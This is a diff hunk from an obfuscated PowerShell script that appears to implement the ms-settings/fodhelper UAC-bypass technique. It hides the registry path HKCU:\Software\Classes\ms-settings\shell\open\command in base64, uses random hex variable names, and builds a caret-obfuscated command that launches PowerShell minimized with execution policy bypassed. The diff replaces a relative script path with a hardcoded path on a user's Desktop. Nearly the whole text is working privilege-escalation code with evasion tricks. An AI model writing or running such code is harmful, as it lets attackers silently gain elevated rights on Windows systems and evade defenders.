@@ -48,10 +48,10 @@ $shitty = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hb
 $shitty2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($shitty))
 $c10ea18da43749a6847617b29862e38d = $shitty2
 
-$9unhhd0182h12d0ni0inniiio12do902 = "test_elevation.ps1"
-$scriptPath = Join-Path $PSScriptRoot $9unhhd0182h12d0ni0inniiio12do902
+$9unhhd0182h12d0ni0inniiio12do902 = "C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"
+#$scriptPath = Join-Path $PSScriptRoot $9unhhd0182h12d0ni0inniiio12do902
 
-$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min pow^ersh^ell -ep b^yp^as^s -fi^le `"$scriptPath`""
+$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min pow^ersh^ell -ep b^yp^as^s -fi^le `"$9unhhd0182h12d0ni0inniiio12do902`""
 #new item
 New-Item $c10ea18da43749a6847617b29862e38d -Force | Out-Null
 
